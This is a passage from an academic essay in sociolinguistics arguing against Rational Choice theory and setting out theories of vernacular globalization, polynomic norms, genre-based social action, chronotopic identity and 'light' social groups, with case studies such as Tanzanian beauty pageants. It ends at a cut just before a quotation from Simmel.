As to restrictions of access to specific contexts, again, nobody has access to all available contexts that make up the communicative economies of societies. This is again clearest in institutional contexts, where, for instance, defendants and witnesses in courts have no access to the context of verdict-making, which is exclusively reserved for the judges. More generally, expert contexts are often decisive in social life, while they are tightly controlled on a “members only” basis by the experts themselves (e.g. Cicourel 1967; Briggs 1997, 2005; Mehan 1996). We often have no impact on what others do with our words in patterns of re-entextualization we call “text trajectories”, in which a subject’s statement is recorded by someone, summarized in a report by someone else for yet someone else, who takes a decision which is then moved down the trajectory and fed back to the subject – as in bureaucratic procedures or newspaper interviews (e.g. Blommaert 2001). Obviously, access to such restricted contexts is already conditioned by (1) above: one needs specific forms of language and literacy proficiency in order to enter such social spaces. And in a world in which large chunks of communication demand access to hi-tech ICT equipment and infrastructures, such inequalities display no tendencies to disappear (Wang et al 2014).
Both forms of inequality would operate across the specter of the sociolinguistic system, but of course, some would be subject to more outspoken and structural forms of exclusion and marginalization than others. Hymes himself focused on the predicament of Native American groups, and speakers of small, minority or immigrant languages are, evidently, in structurally weaker positions than speakers of majority and prestigious varieties – recent sociolinguistics has provided an avalanche of work on these themes (for an elaborate case study, see the essays in Blommaert et al 2012). Thus, sociolinguistic inequalities characterize every social system, and the causes for such inequalities are social. Hymes (1996) coined the term “voice” for the actual capacity for people to make themselves understood and noted that problems of voice represent the critical dimension of sociolinguistic work: rather than merely describing sociolinguistic diversity as a kind of juxtaposition of equally valuable varieties, we should engage with the question as to why particular varieties are, in actual fact, not equal to others – questions of voice as a sociopolitical given, voice as the reflection of social structures in the actual communicative abilities of people (cf. Blommaert 2005, 2008b; Van der Aa 2012; Scott 2013).
The latter move involves and presupposes attention to repertoires: the actual resources people have acquired and can effectively deploy in communication. The notion of repertoire has only recently been made into a topic of profound reflection, often from an awareness that widespread qualifications such as “speaker of language X”, or even “(non)native speaker of language X” are entirely inadequate as descriptors of the tremendous diversity in degrees of proficiency and communicative ability people display (e.g. Blommaert & Backus 2013; Rymes 2014; Busch 2015). Repertoires are by definition uniquely individual and can be described as “indexical biographies” reflecting the social experiences of people to specific orders of indexicality – exposure, immersion, learning, informal acquisition – and the ways in which such experiences reflect the social order and inscribe individuals into a wide variety of group memberships. What is in people’s repertoires is usually there for a good reason: because they needed it at some point in social life; in that sense, repertoires are traces of social norms, or if you wish, traces of the compelling and often even coercive and consequential evaluative responses of others in our lives – traces of power, in short. Taking that to the theoretical level: repertoires once more show how becoming and being a unique individual is a fundamentally social process: socialized, dialogical, normative, dynamic.
Facts of sociolinguistic distribution, we can see, shape a field of power and are reproduced by it, and turn language, in its various manifestations, into a heavily policed object in which potentially every difference can be turned into a consequential form of inequality. The term “voice”, as used here, points towards this consequentiality: the normative organization of language – notably the tendency to “standardize” forms of language and language usage into highly politically sensitive templates – affects the life chances of people, and sociolinguistics has brought a wealth of evidence to this point. Specifically through the lens of sociolinguistic analysis, we can observe in great detail the way in which an infinitely fractal system of normativity – indexicals and their forms of order – turns into a capillary power structure in Foucault’s (2015) sense, with on the one end elaborate formal and institutional systems of “language testing” (e.g. Extra, Spotti & Van Avermaet 2011; Spotti 2016),[22] and on the other the minute-by-minute evaluative judgments of people’s communicative actions by their interlocutors in everyday life.
3.4 Language, the social fact
If Durkheim would have looked more closely at language and how it operates in and through society, he would have had considerably less trouble establishing his fait social. Half a century of sociolinguistics has proven, at great length and in infinite detail, that language can only be explained as a social fact – other explanations are absurd. Particularly absurd, we can conclude quite confidently, is Rational Choice. Almost everything that has been brought up by sociolinguists flatly contradicts the central assumptions of Rational Choice and offers mountains of hard and conclusive empirical evidence for this contradiction. The worldview of Rational Choice, from a sociolinguistic viewpoint, is that of a world populated by people who only talk to themselves.
Perhaps the greatest advantage of sociolinguistics, and its most important contribution to sociological theory, is the highly detailed and precise view of normativity I discussed in 3.1. The “norms”, “values” and “collective representations” that characterize the Durkheimian (and Parsonian) assumptions about integration and social coherence are given a feet-on-the-ground realism as continuously evolving, dialogically constructed social actions in which “meaning”, in the traditional linguistic sense, is entirely blended with sociocultural evaluations of a moral nature, precipitating what we call “identity”. Identity is not a product, nor an a priori, but the material of interaction itself and, so, the material of social order. Since this material is extremely diverse, the social order is too, and the robust confidence with which, for instance, Parsons (2007) spoke about the “American core values” appears entirely unjustified from the viewpoint of sociolinguistic evidence – the price of analytical precision is ontological diversification (Parkin 2016).
Remember that one of the central arguments in favor of methodological individualism was that in human action, only individual subjectivity was observable. On the basis of what we have seen so far, this argument, too, has been dealt a death blow. Sociolinguistics’ contribution to a theory of social action is intersubjectivity: the fact that people, when communicating, require a dialogically established normative template shared with others in order to arrive at “meaning”; the latter is an interpretive effect, constantly negotiated and accommodated intersubjectively (and not necessarily by means of “purely” rational means). To the extent that social action is communicative action, it is joint action (cf. Blumer 1969; Cicourel 1973).
In the next section, I shall add to what has been established so far. There were things that Durkheim and his successors in the Grand Tradition of sociology couldn’t possibly have known. They nuance some of the assumptions underlying classical sociology and they open exciting alternative trajectories of sociological re-imagination. Needless to say that they will also add to the mountains of empirical evidence proving the absurdity of Rational Choice.
What Durkheim could not have known: Après Durkheim
Several of the phenomena discussed in the previous section bore the imprint of globalization. An acute awareness of globalization as an ongoing reality-shaping and reshaping process is what sets our sociological imagination apart from that of Durkheim and his followers, who operated within the confines of the nineteenth- and twentieth-century nation-state and its social and institutional organization. Durkheim was, along with many of his disciples, a methodological nationalist whose sociology did accept change (indeed, as we have seen, coming to terms with social change was what prompted Durkheim to his intellectual efforts), but change within a sedentary system which was coincident with the nation-state. This is remarkable, for globalization was very much a reality in Durkheim’s days. Colonization and an increasingly integrated world economy – Hobsbawm’s “Age of Empire” (1987) – had brought the world to places such as Paris and London. But this world was seen through the specter of one’s country, the structures, needs and imagination of which depended, precisely and paradoxically, on its global reach.
The current phase of globalization is, on the one hand, qualitatively different from that of the Age of Empire, and this is to a very significant extent an effect of the internet – a technology that changed the world in the last decade of the twentieth century, allowing a tremendous increase in speed, volume and density of global flows and networks (see Castells 1996; Eriksen 2001). Due to this change, Hobsbawm (2008: 155) observes how “the Empire expands wider still and wider”: the global internet infrastructure and the pattern of traffic density mirrors, astonishingly, global patterns of information networks established in the late 19th century; persistent global inequalities are, in that sense, extended and expanded by the internet (see Read 1992; Blommaert 2016b). And such processes shape as well as occur in a new environment of communication and information, the details of which we are beginning to understand (cf. Seargeant & Tagg 2014; Varis & van Nuenen 2017). The point in all of this is that those who prefer to believe that there is nothing fundamentally new to the current stage of globalization are quite dramatically wrong. We are indeed witnessing a very, very profound qualitative change with momentous effects on the nature and circulation of knowledge and sociocultural norms, as well as on the structure of communities and social cohesion. More on this below.[23]
But on the other hand, as said earlier: perhaps even more importantly, the present stage of globalization is accompanied by an awareness of it, an awareness that social processes nowadays operate at a variety of scales, of which the nation-state is just one and the global reach of the worldwide web another. And this awareness is revisionist in nature, as it forces us to revisit and redirect a sociological imagination circumscribed and colored by methodological nationalism. Both points – a qualitative difference and a different awareness of globalization – are things that did not belong to the worldview within which Durkheim and successors such as Parsons operated.
In what follows, I shall explore the revisionist effects of this. And I shall do this, somewhat provocatively, by sketching a series of theories emerging from contemporary sociolinguistic work and using a simple assumption: if interaction is what makes us social, theoretical insights into interaction must have wider relevance and can be used as a template for theorization at a higher level.[24] As noted at the very beginning, formulating theories is not exactly sociolinguists’ bread and butter – but the editor of a recent volume on theoretical debates in sociolinguistics explicitly invites it (Coupland 2016). So let me try.
It goes without saying that much of what I shall present here cannot strictly speaking be called “new” theory. Similar ideas have circulated throughout the 20th century and have gained currency in the first decade of the 21st – echoes from Goffman, Giddens, Simmel and even Husserl will be heard, and I gladly join Castells (2010) in fact-checking and updating his own late 20th century predictions. What sociolinguistics contributes, however, is a set of empirical arguments that make such theoretical propositions compelling and inevitable; it also offers an empirically solid basis for reformulations of social theory. Note that while the previous section was largely retrospective, drawing on achievements from sociolinguistic research of the past decades, this section will be more prospective, drawing on current ongoing work, and therefore also programmatic in tone.
Since in what follows the discourse will change, it may not be a bad idea to specify what I understand by the term ‘theory’. What we call theory is a particular kind of statement. It is a statement that tries to describe and define a type of phenomena out there, in such a way that research on individual tokens of these phenomena can be hypothetically generalized. Theories, then, are statements that enable a generalizable heuristics based on hypothesized type-token relationships. Such statements are, ideally and in the tradition of Anselm Strauss’ “Grounded Theory”, already saturated with evidence – they are, to some extent, already proven (cf. Holton 2008). But even if a theory is already backed up by a serious amount of supporting evidence, in each new piece of research it must operate as a question to be answered – or to use a more familiar terminology, as a working hypothesis.
4.1 Preliminary: A theory of vernacular globalization
There has been no shortage of globalization theories over the past couple of decades, and some of them are good. But sociolinguistics brings something exceptional to the field of globalization studies: a perspective in which the “big” movements in globalization (often called “flows”: Appadurai 1996) need to be constantly checked by the minutiae of on-the-ground communicative practices in which such global forces are being enacted and turned into locally performed meaning (see e.g. Pennycook 2007, 2010) – something for which Appadurai coined the term “vernacular globalization” (1996: 10). Observe that for Appadurai, vernacular globalization is more than just a descriptive term, it is a gloss for the general condition of contemporary modernity:[25]
“The megarhetoric of developmental modernization (…) in many countries is still with us. But it is often punctuated, interrogated, and domesticated by the micronarratives of film, television, music and other expressive forms, which allow modernization to be rewritten more as vernacular globalization and less as a concession to large-scale national and international policies”. (ibid.)
To be sure, the dialectic of global and local forces in the experiential life-world of human beings (in other words, of vernacularization) is perhaps the most complicated descriptive and methodological issue in the study of globalization processes, and the introduction of a new generation of electronic media has certainly complicated matters. This was noticed early enough. Appadurai (1996: 194) noted “new forms of disjuncture between spatial and virtual neighborhoods” as an effect of the globalization of new electronic media, seriously complicating the actual meaning of a term such as “local practice”; he also saw the emerging of “diasporic public spheres” revealing new horizons for political and social action, usually imagined within the confines of the nation-state (1996: 22).[26] Manuel Castells (1996), in turn, described the massive effect of new information technologies on economic and political processes, on the organization of labor, on identity work and on social organization. Castells predicted the development of a new type of social formation which he called “network” and which was not contained by the traditional boundaries of social groups. Both (and many more) saw a complex new sociocultural, political and economic order in the making, and invited others to join them in describing and theorizing these changes. Some of those who felt addressed by this call were sociolinguists.
It is my thesis that contemporary sociolinguistics has almost comprehensively theorized vernacular globalization as a condition of everyday life, the framework of which can be sketched by the keywords polycentricity, mobility and complexity, which also count as its ontological assumptions.
Polycentricity stands for the fact that in every environment for social action, multiple sets of norms will be simultaneously present, although they might not be of the same order – they are scaled, stratified, and in that sense never ideologically neutral even if represented as such (Carr & Lempert 2016: 3). Polycentricity defines the intrinsic indeterminacy of social actions and processes, and their non-unified character: social change involves parts of society developing faster than others, creating anachronistic gaps.
Mobility is shorthand for the assumption that social life, even if “local” in so many senses of the word, is never sedentary but always moving from one chronotope into another one, across scales and centers of normative focus (cf. Blommaert 2015d). Mobility defines the intrinsic instability of social action and processes.
Complexity makes us aware of the fact that, even if every form of social activity evolves within a system of such activities, that system is always unfinished, dynamic, and nonlinear or stochastic in the sense that outcomes may not be predicted from initial conditions (cf. Blommaert 2016c). Complexity defines the intrinsic tentativeness and potential redefinability of social action and processes.
This is, of course, a mere sketch of a theory framework, which in essence represents a cumulative and generalized result of a wide variety of different more precise sociolinguistic theorizations. This theory of vernacular globalization, therefore, requires several other more specific theories, providing more clarity to the keywords. I shall now turn to these more specific theories.
4.2 An indexical-polynomic theory of social norms
Let us recall the insistence, throughout the Durkheimian tradition of sociology, on norms as the key to defining and understanding the social fact, and let us now return to the discussion in 3.1 above on ordered indexicality. In that earlier discussion, I explained how “norms”, in contemporary sociolinguistics, need to be seen as nonrandomly organized patterns of indexical order, and I stressed the collective and dialogical character of such sociolinguistic norms as a decisive argument against Rational Choice.
This is of course an ontological statement, and I believe we can broaden its scope from interaction and its ordered indexicals to social behavior in general. Seen from that angle, social norms are, in actual fact, ordered sets of interactionally ratified behavioral details which we can call “behavioral scripts”. Note, once more,
That whatever is normative in social life is socially co-constructed in the process of interactional meaning-making, subject to continuous ratification by others, and therefore tentative in character; and
that there is nothing abstract to “norms” (or “values”) other than the terms we use to describe them. In real social life, “norms” take on a variety of concrete behavioral shapes.[27]
But that is not all there is to be said on this, certainly when we consider globalization and its sociolinguistic impact. In order to establish that, let us have a look at some research.
In a truly brilliant study, Sabrina Billings (2014) examined beauty pageants in Tanzania – an outlier, so to speak, in the world of English and of global mediascapes in Appadurai’s (1996: 33) terms. Billings focused on how the selection of the most appropriate candidate for Miss Tanzania (through a scaled procedure starting locally, then regionally, then nationally) invoked and deployed sociolinguistic hierarchies in which “good English” – fluent performance in a variety of English judged to be not-too-local – was the pinnacle of eligibility, even when, officially, candidates could produce public discourse in both Swahili (the national language) and English. Why is “good English” so important? Because it serves as a crucial indexical suggesting superiority on, at least, two levels: nationally and due to the particular sociolinguistic history of Tanzania, English is the prestige code associated with the status of being “educated” (Billings 2014: 38-53); internationally, because national pageant organizers operate within the “Miss World” format (Billings 2014: 61) and the Tanzanian winner will proceed to the global competition – where “good English”, once again, is a powerful diacritic.
“Good English”, as a diacritic in the pageant, is of course not sufficient: the young women competing for the title of Miss Tanzania must also be judged to be physically beautiful, elegant and intelligent (Billings 2014: 92-96). We see a behavioral script emerge here, in which discursive normativity – speaking in “good English” – is an element of the total order of indexicality that rules the pageant. But while it is not sufficient, “good English” is decisive. In several examples – quite painful to read – Billings shows how even top contenders can be mercilessly sanctioned by the critical audience when their on-stage discursive performance in English is judged to be inadequate. Describing audience reactions in one such case, Billings writes:
“The pageant-savvy audience sees through her flimsy effort to insert a memorized response to a different question into the answer slot. In attempting to present herself as a fluent speaker of standard English, the contestant has instead, through her inability to answer spontaneously, indexed herself as a linguistic phony.” (2014: 107)
The candidate’s discursive performance, in other words, was judged to be dishonest, and therefore a betrayal of the behavioral script she tried to produce – that of someone who is educated and smart (hence using “good English”) and worthy of proceeding to the Miss World election. Her discursive performance exposed her, in short, as a liar, and this was grounds for exclusion – norms, we can see again, have effective power effects.
Note two important points here.
We see, one, that the ratification of the failed behavioral script is a judgment of the entire person, and the judgment is moral in tone and character: the candidate is dismissed because her sociolinguistic features were judged to be “untrue”, not authentic, not honest. We see that, in actual practice, the social norms of the Durkheimian world are moralized behavioral scripts. Note, pace Durkheim, that the moral is entirely concrete and empirical here, operating on a range of very concrete behavioral features.
We also see how such judgments are scaled, with at last three different sets of criteria playing into each other in a mutually reinforcing way. There are the national and international indexical orders already mentioned above, and there is the order of the situated, actual moment of performance. The candidate stumbled over words, tried to start again, manifestly repeated an earlier statement, and produced a thick “local” accent in one expression – and all of this provoked cruel laughter from the audience. Into the perceived violation of local rules of performance, the national and international ones were infused by means of what Irvine & Gal (2000) called “fractal recursivity”, jointly and simultaneously resulting in a shattering judgment of the candidate.
This is where we can become more precise with respect to the notion of “polycentricity” mentioned earlier. Speech events such as the ones described by Billings are governed by various sets of norms operating on various “dimensions of social life” (Carr & Lempert 2016) and orienting towards different real or imagined centers of authority (Silverstein 1998; Blommaert 2005: 172). Some of these norms are general – think of the norms governing genres such as public speech – while others will be specific – the norms of public speech in a beauty contest in Tanzania, for instance. We can see how this contributes to the theory of vernacular globalization sketched earlier.[28]
Furthermore, I believe we can generalize this insight, certainly in the age of widespread social media usage. Communicative actions will always be subject to various simultaneously operating sets of norms, since they will always demand attendance to the rules of actual interactional conduct, those of the topic of the interaction, its purpose or function, the social and cultural conventions governing conduct within specific participant frameworks, particular spaces or times, specific types of encounters, and so forth. A Facebook update, for instance, demands attendance to the (highly dynamic) norms of literacy and linguistic codes, the genre and register norms of an “update” (not too long, preferably multimodal, etc.), the tacit norms of one’s community of “friends” regarding certain topics and ways to discuss them (think of prevalent political orientations in one’s Facebook community), the Facebook rules of conduct (proscribing certain forms of obscenity, for instance), and the rules of the algorithmic system behind Facebook that render certain updates more visible than others. And whether or not one is aware of these rules doesn’t really matter: every update will generate effects related to all these different but simultaneously operating sets of norms.
Thus, whenever we interact with others we find ourselves in a polynomic social arena. We do not respond to just one set of norms but to multiple sets of finely defined norms governing aspects of the specific interactional events and its context. We can call such sets of highly specific norms microhegemonies. And the presence of multiple microhegemonies turns every instance of social action into a polynomic social event.
Sociolinguistic work brings a far more precise and empirically verifiable theory of norms and normativity to social thought than most other approaches. When we think of “norms”, we see a polynomic complex of moralized behavior scripts: several concrete sets of ordered indexicals microhegemonically governing aspects of conduct, played out simultaneously towards, and with, interlocutors who continuously valuate them morally and feed these valuations back to us. And given the centrality of norms in any sociological imagination since Durkheim, this theory will have repercussions on others.
4.3 A genre theory of social action
Sociolinguistics has, for decades, been concerned with the notion of genre, as a historically established and socialized set of linguistic-communicative features (an order of indexicality, in other words) that enables specific forms of communicative behavior to be recognized as, for instance, a joke, a lecture, a confession, a poem, a novel (Halliday 1978; Hymes 1981; Bakhtin 1986; Fabian 1991; Blommaert 2008c). From such evidence, we also know that all communicative behavior is genred – or at least, that if we intend to make our communicative behavior understood by others, it needs to be recognizable as an instance of a specific genre. Genre, thus, operates very much in the sense specified above: while every instance is unique and special, recognizability is generic, i.e. it rests on the iterativity of the ordered indexicals pointing to specific genres. Every novel is recognizable as “a novel”, but still we have our favorite novels.
I believe this insight can be generalized. Social actions do not emerge from nowhere, not can they be seen as pure acts of creativity. They are performances based on already existing cultural material, always uniquely contextualized and situated, and therefore operating with a degree of creativity. So two dimensions are crucial here, for jointly they construct social actions as situated, performative genre work:
Iterativity: the usage of already existing genre templates;
Creativity: the deviation from such templates in unique instances of genre performance.
Iterativity provides what we can call the ‘structural’ aspect of social action. It ensures the recognizability of actions: they proceed largely within existing orders of indexicality that are interactionally understandable-as-something. Generic iterativity also turns situated social action into a fundamentally historical phenomenon – where does this iterated cultural material come from? How did it acquire its function as generic template? And thereby, of course, it should be seen as a crucial element in explaining sociocultural transmission and spread.
Creativity provides what we can call the ‘diversity’ aspect of social action. It ensures the uniqueness of the situated deployment and performance of genred features of action, of its participants, and of its chronotopic peculiarities – how does this particular situated instance of social action function in this particular way? Creativity, in that sense, can be seen as an “inflection” of genre templates, the small bits of deviation-from-a-model that turn the actual instance into something that triggers interactional uptake and appraisal. This particular lecture is nice, engaging and fun, versus boring, silly and uninteresting. It is still a lecture – the genre template has been satisfied – but it is a particular evaluated token of that type.
Creativity, however, also accounts for the contingent nature of social action (in the sense of Garfinkel 1967): the inevitable indeterminacy, open-endedness and uncertainty characterizing any form of social action and manifesting itself in the very well-known category of phenomena we call misunderstanding. And while creativity usually only accounts for a relatively minor part of social action – it is a small inflection of iterative templates – in everyday lived experience it prevails over the iterative basis of action. Our reactions and judgments of approval or rejection are based on the inflection, the ‘accent’, present in the uniquely performed act – which we can judge and react to because it is not entirely unique.
This genre theory has methodological consequences: the validity of examples in analysis rests on their generic recognizability, on the fact that through and beyond their unique situatedness, we can spot the larger, historical genre template for such social actions. Every instance of social action is evidently unique, but only to a degree. For it is also generic, and in that sense always a token of a type, “representative” of that type. The genre theory, therefore, can be seen as the grounding for an ethnography that satisfies both the demand for ecological validity and for representativeness.
An important remark must be placed here regarding current internet phenomena. In the iterative part of internet-based social action, the influence of algorithmic processes needs to be taken seriously. Such algorithmic processes are often described by means of terms such as “echo chamber effects” or “bubble effects” (Pariser 2011; Tufekci 2015; van Nuenen 2016), and they refer to the fact that machines organizing activity in, for instance, social media environments, create communities of people who (in the views of those designing such algorithms) should “share” something – interests, social characteristics, opinions, and so forth. Even if there is presently hardly a way in which we can profoundly and directly examine this – these algorithms are among the best-kept industrial secrets – there is little doubt that their effects reinforce and enlarge the iterative features of actions, perhaps pushing them even towards new levels of generic uniformity. Research on this is, as said, extremely difficult, but when investigating online actions, it is wise to keep an awareness that not everything we observe is an effect of deliberate human choice and agency, but an artifact of algorithmic agency.
4.4 A microhegemonic theory of identity
I now move to two theories that are two sides of the same coin: a theory of identity, followed by another one of social groups that essentially extends the former. While there is no sensible way in which we can talk of identity without talking about the social groups in which identities are performed and enregistered, I separate them here for clarity’s sake, because identity and social groups are, in many studies, isolated as separate domains of study.
Communicative practice is always and invariably an act of identity. Sociolinguists have taken this insight on board since the mid-1980s (Le Page & Tabouret-Keller 1985), turning it, as Allan Bell observes, into one of the most productive topics of sociolinguistic research in recent years (Bell 2016). Very few sociolinguists need to be convinced of the performative and creative nature of identity (in other words, of identity not as a given but as something that emerges in social action); of its dialogical nature (creating a difference between enacted and ascribed identities), of the plurality of identities; of the dynamics of “serious” and “ludic” identity work prevalent in practices such as “styling”; and of identity as a problem central to a complex politics of performance and ascription (for surveys, see De Fina, Schiffrin & Bamberg 2006; Coupland & Jaworski 2009; sophisticated examples include Harris 2006; Rampton 2006; Möller 2017) So here too, we can draw extensively on sociolinguistic insights.
This could be helpful, for the problem of categorization (another word for identity ascription) in research is an old one in social and human studies, notably in quantitative ones where a degree of stability in research design is mandatory across the sample. No one has described the problem more incisively (and casually) than Erving Goffman:
“The variables which emerge tend to be creatures of research designs that have no existence outside the room in which the apparatus and subjects are located, except perhaps briefly when a replication or ‘continuity’ is performed under sympathetic auspices and a full moon” (1971: xxv; for a more terse discussion see Cicourel 1974).
There is an assumption that every subject can (and perhaps should) be determined as to identity by describing him/her along essential bureaucratic parameters such as nationality, age, gender, social class, ethnicity, religious affiliation, profession; extended, sometimes, to include educational qualifications, income, family relationships, sexuality and health status. And this, let us note, is where we continue to feel the full weight of the Durkheimian tradition in research, for those are the diacritics of the modern “thick” communities that have preoccupied macrosociological research in the tradition we associate with him. The assumption, reformulated, is that we can know and understand society when we divide it into segments and relationships based on these identity categories.
In contrast to that tradition, I propose to see identities as chronotopically organized moralized behavioral scripts; I use the term microhegemonies as shorthand for that contorted phrase. And let me now explain what I mean by that.
Let us recapitulate some of the elements in Sabrina Billings’ study of the role of language in Tanzanian beauty contests, discussed above. We saw how the use of language – particular forms of English, to be more precise – was a key part of a larger set of features displayed by the contenders, and judged by the audience and the jury in relation to perceived norms of “good” conduct in such events. In fact, what we saw was that “beauty queen” – an ascribed identity category – needed to be performed by enacting a set of different, dispersed “qualities” – beauty, intelligence, education levels, humor – of which perceived fluency in “good” English was emblematic. I emphasized that this normative system was polycentric and scaled, with local and nonlocal norms piled up onto one another, and that the judgment passed by the audience when one of the contenders failed to display the expected fluency in “good” English, this was a moral judgment of the entire person: she was seen and condemned as a phony.
The judgment, an identity judgment, in other words, was a moralization of the degree of normativity perceived in the contender’s display of a composite set of behavioral norms – a behavioral script that needs to be followed to some degree of satisfaction – which was specific to the occasion of the beauty pageant – it was chronotopic.
The latter is of critical importance. We long know from a wide and highly diverse literature that people do not “have” an identity but perform identities. In the observable conduct of people, there is no such thing as “identity”: we can observe concrete, situated and contextualized identity work. This contextualization is of paramount importance: we need to adjust our identity work to the highly specific demands of particular contexts. To unpack that last term: “context”, in actual fact, is a concrete timespace configuration in which particular forms of identity are expected, required or optional, and in which, consequently, we need to deploy highly particular resources drawn from what we can conveniently call “identity repertoires” (cf. Blommaert 2005: 234; Blommaert & De Fina 2017). Concretely: the beauty pageant, with its complex layered normative orientations to global and local diacritics of success and failure, is a specific chronotope. The contenders can only be given the identity of “beauty queen” in the timespace configuration of the pageant; outside of it, a contender would be an office clerk, somebody’s daughter, a student, and what not. “Beauty queen” and the behavioral scripts out of which it is constructed, are things that are specific to that particular chronotope – just as bicycle racers can only call themselves “world champion” when they have won one particular race, the world championship race. Identity work, in that sense, is never “all over the place”, it is very much connected to specific timespace niches.
Chronotopes help us get a precise grip on what we mean by mobility in this stage of online-offline globalization. We perpetually move from one chronotope into another, then back to the first and on to a third, and so forth. And we can describe in detail how such moves actually proceed, in physical as well as in sociocultural, politicized space. A shift from one chronotope into another, we can see, involves a massive shift in identity opportunities and criteria of judgment: what works well in one chronotopic environment may backfire in another, and vice versa. Lian Malai Madsen’s (2015) study of a martial arts club in Copenhagen is a case in point. The club is superdiverse in composition and counts a large number of young Copenhagers with a migration background. These “migrant youth” are publicly seen and often described as “poorly integrated”, marginalized young people, both educationally and in the labor market. They are a social problem. But in the martial arts club, they are often the stars, the centers of attention and bearers of prestige and status as champions. In the club, we see a carnivalesque reversal of everything these youngsters are outside of it. Their skills, competences and patterns of performance – the same ones as those that give them the negative ascribed identities mentioned a moment ago – are seen as fully integrated, as signs of extraordinary capability and even as things to be emulated by others.
In Madsen’s study, we see quite profound identity shifts sequentially, as subjects move from one chronotope into another one. Chronotopes can and do simultaneously overlap as well – this is one of the aspects of what I call polycentricity. A mathematics class, for instance, is of course an institutionally regimented chronotope in which form and contents are tightly scripted and policed by the teacher; but that class may at the same time be seen as a congregation of teenage peer groups, an entirely different chronotope following a (sometimes dramatically) different set of normative behavioral expectations than those imposed by the school and the teacher, and displaying a highly different dynamics of identity as well: the underperforming student in the eyes of the teacher may be, because of exactly the same behavioral features, the coolest kid in class and a role model for his peers. In fact, we can see Goffman’s (1959) famous distinction between “front stage” and “backstage” as two simultaneously overlapping chronotopes, each with their own identity affordances and systems of normative organization; and many of the interaction rituals he described can be reconsidered as microhegemonies specific to particular chronotopic environments as well (Goffman 1967, also 1961, 1981; see also Silverstein 2005). Goffman’s oeuvre, in fact, can be seen as a consistent engagement with how Americans in his time organized their social relations through forms of interactional behavior adjusted to the chronotopes they inhabited – hence titles such as “Relations in Public” or “The lecture” (Goffman 1971, 1981, chapter 4).
Goffman described the microhegemonies of an offline society. It is evident that the online social space has enabled a multiplication of available chronotopes and relations between chronotopes, and thus generates a wide range of new modes of identity work. Since a tremendous amount of research is presently in the process of being rolled out, I must confine myself here to a general sketch of available insights, and start with some comments on the particular communicative practices we observe in the online world (for surveys see Leppänen & Peuronen 2012; Androutsopoulos 2016; Varis & van Nuenen 2017: Leppänen, Westinen & Kytölä 2017).
In a general sense, the emergence of online communication as a feature of everyday life has dramatically increased the importance of literacy, and more specifically of multimodal literacy. Online communication is overwhelmingly written (or “designed”: Kress 2003; Jewitt 2013). Writing, as we know, is a field of normativity which is structured quite differently from spoken discourse – writing “errors” are often treated with considerably less tolerance than errors in speech – but, at the same time, online writing practices display an incredible dynamism and innovativeness dislodging the traditional boundaries of “writing” (and, evidently, those of language in its traditional sense). Consider the now widespread use of emoticons and expressions such as “OMG” and “LOL”, the influence of AAVE-based HipHop register in new genres of mobile and online communication (Kytölä & Westinen 2015), the complex blends of visual, textual, static and dynamic features of contemporary websites, and, especially, the phenomenon of “memes” (Du 2016). People do very different things in and with semiotic material online, compared to what they do in offline contexts.
Much of what is done, especially on social media, appears to be what is known as phatic communion: the transmission and exchange of messages in which not propositional content (“information”) appears to be a central concern, but the maintenance of “convivial” social relations and the performance of specific acts of identity – that of, e.g., a “friend” by means of Facebook “likes”, a “follower” by means Twitter retweets, or just an “acquaintance” by means of quick and short mobile messages (Miller 2008; Jones 2014; Varis & Blommaert 2013; Velghe 2013).
The boundaries between online and offline social processes are porous. Registers of online activities such as Mass Online Games can spill over into the everyday vocabulary of gamers and become new indexicals for expressing social ties (Sierra 2016)¨, and online activities become a learning environment where resources are built and circulated that are useful offline and now also profoundly influence such offline practices (Leppänen 2007; Maly & Varis 2015; Blommaert 2016d). Conversely, offline identity features can influence the choice and use of specific online platforms and modes of conduct (boyd 2011). And, of course, new phenomena such as online dating are meant to go offline as soon as the first online steps have been completed (Toma 2016). The Internet has also become an enormous repository of explicitly didactic and normative material – the “how to?” genre – in which people can get clear instructions for how to perform specific forms of identity (Blommaert & Varis 2015).
Even so, online forms of self-presentation have characteristics and affordances of their own, not reducible to existing offline resources. Given the absence, in general, of face-to-face contact, people can hide behind an alias and construct entirely fictional personae for themselves – something that characterizes the darker side of the online social world (boyd 2014: 100). But in more benign ways, there is a tendency to present oneself in the “my best day” mode – the way one wishes to be perceived by others (Baron 2008: 71; boyd 2014). There is also a plethora of new and reconfigured discursive genres, ranging from “Wiki”-like formats of collaborative writing to particular modes of confessional narrative, raising issues of privacy and the limits of self-exposure (cf. Page 2012; van Nuenen 2016). The online world is a space where distinct forms of identity work can be performed, only distantly connected to what goes on elsewhere.
In spite of this final remark, all of the above implies that quite a bit of contemporary identity work is carried over and oscillates between online and offline contexts, creating highly intricate connections between, for instance, what is microhegemonically expected or permitted in the chronotope of Facebook and that of the school playground (think of cyber bullying) or the workplace (think of employers monitoring employees’ social media accounts). The chronotopic nature of identities thus now evidently creates an enormous panorama of possible and expected identities, vastly more than those captured by the bureaucratic, ‘thick’ diacritics I mentioned at the outset. The variation of chronotopes we move through in social life demands, and endows us with, a plethora of ‘light identities’, if you wish, not excluding the old and established ‘thick’ categories but complementing them – “big” diacritics such as race, gender, class or ethnicity are not absent, but they are performed in different and sometimes surprising ways (e.g. Rampton 2006; Harris 2006; boyd 2011; Goebel 2015; Wang 2015; Faudree 2015; Fox & Sharma 2016).
At the level of everyday experience, however, our identities and those of others depend strongly on details of behavior and appearance, of which a certain amount needs to be displayed and performed – identities, one can see, are judged on the basis of perceptions of “enoughness” (Blommaert & Varis 2015). We can see a reflex of the genre theory of social action here: identity work is evidently genre-based, and it will display the same calibration between tendencies towards similarity and tendencies towards deviation as the one we encountered when we discussed genres.
4.5 A theory of “light” social groups
The discussion of identity already showed that the ‘thick’ diacritics of identity are not out, but that they are in need of a more delicate balancing with a wide range of other, ‘light’ forms of identity. To name just two, social class is not out, and neither is ethnicity – but both are now imaginable as far more “styled” than “given” identities, drawn from within a repertoire of identities that contains lots of different orientations. This obviously has a bearing on the discussion of social groups as well.
This discussion has a very long pedigree. Classics of sociology address “society” as their object, and attempt to find and express the rules that guide it. Sociology, it is said, is the science of society. How such a society should be defined, however, has been a consistent bone of contention since the very early days of sociology as a science: generally speaking, authors reserve the term “society” for the perceived permanent features of a social system, often ad hoc circumscribed by the nation-state – the features believed to be were less subject to rapid or radical change – as distinct from features that were seen as “superficial”, transient or less reliable as indicators of “social structure”.
Here is what Georg Simmel had to say about it. Noting that the sociology of his era still had to prove its right to exist, notably against proponents of Methodological Individualism, Simmel emphasizes the fact of interaction as the eminently social phenomenon – see above – and then observes (1950: 9):
